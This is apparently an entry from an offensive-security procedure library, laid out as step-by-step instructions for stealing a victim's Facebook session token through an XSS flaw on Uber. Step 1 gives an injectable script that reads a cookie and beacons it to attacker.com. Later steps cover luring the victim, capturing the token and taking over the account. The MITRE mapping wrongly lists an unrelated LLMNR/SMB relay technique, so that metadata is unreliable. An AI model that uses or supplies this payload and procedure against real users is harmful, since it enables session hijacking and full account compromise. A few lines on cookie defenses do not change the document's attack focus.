---
id: proc-steal-facebook-token-uber
name: Steal Facebook Session Token via Uber XSS
tags:
  - session-hijacking
  - token-theft
  - xss-exploitation
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-13T23:55:38.491Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques:
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[LLMNR-NBT-NS Poisoning and SMB Relay]]'
  - '[[Steal Web Session Cookie]]'
---
# Steal Facebook Session Token via Uber XSS

## Summary

This procedure exploits the Uber XSS to inject JS that accesses and exfiltrates the victim's Facebook session token, leveraging a bypass to interact with Facebook resources from the Uber context.

## Description

With JS executing in uber.com's domain, the payload targets Facebook cookies or session data, potentially using techniques like JSONP or beacon requests to steal tokens. The reported bypass allows reading cross-origin data, leading to session hijacking and data theft. Impact includes full account compromise.

## Requirements

1. Victim authenticated on both Uber and Facebook
2. Attacker server to receive exfiltrated data
3. Advanced JS knowledge for cross-origin bypass

## Defense

Defensive measures and detection strategies:

- HttpOnly and Secure flags on sensitive cookies
- SameSite=Strict for cross-site requests
- Anomaly detection in session logs

## Objectives

1. Access Facebook session from Uber context
2. Exfiltrate token to attacker
3. Validate hijacking potential

## Instructions

### Step 1: Inject Token-Exfil Payload

**Context**: Modify the earlier payload to target Facebook cookies.

Use <script>var fbToken = document.cookie.match(/fbcookie=([^;]+)/)[1]; new Image().src='https://attacker.com/steal?token='+fbToken;</script>, encoded and injected via URL.

> Assumes shared or accessible cookie; adjust for bypass method from report.

### Step 2: Execute and Capture Data

**Context**: Trigger execution and monitor attacker server for incoming requests.

Host the page, have victim visit, and check server logs for the POST/GET with token.

> Expected: Request like /steal?token=abc123 arrives.

### Step 3: Test Hijacking

**Context**: Use stolen token to impersonate victim on Facebook.

Paste token into browser or tool to access Facebook API/sessions.

> Success: Attacker gains unauthorized access to victim's Facebook account.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[LLMNR-NBT-NS Poisoning and SMB Relay]]
- [[Steal Web Session Cookie]]

### Sub-Techniques

- [[LLMNR-NBT-NS Poisoning and SMB Relay]]

## Commands Used


## Tools Used


## Tags

- [[session-hijacking]]
- [[token-theft]]
